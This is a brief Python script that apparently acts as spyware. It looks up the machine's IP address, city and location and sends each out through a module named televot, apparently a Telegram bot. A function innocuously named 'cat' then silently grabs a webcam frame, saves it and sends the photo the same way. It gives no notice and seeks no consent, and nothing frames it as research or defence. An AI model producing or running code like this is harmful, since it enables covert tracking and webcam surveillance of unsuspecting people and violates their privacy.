import get_ip
import televot
import cv2



print(televot.send_msg(get_ip.ip_address))
print(televot.send_msg(get_ip.city))
print(televot.send_msg(get_ip.location))

def cat():
	cap = cv2.VideoCapture(0)
	for i in range(20):
		cap.read()
	ret, fram = cap.read()
	cv2.imwrite('cam.png',fram)
	cap.release()

print(cat())
print(televot.photo('cam'))
    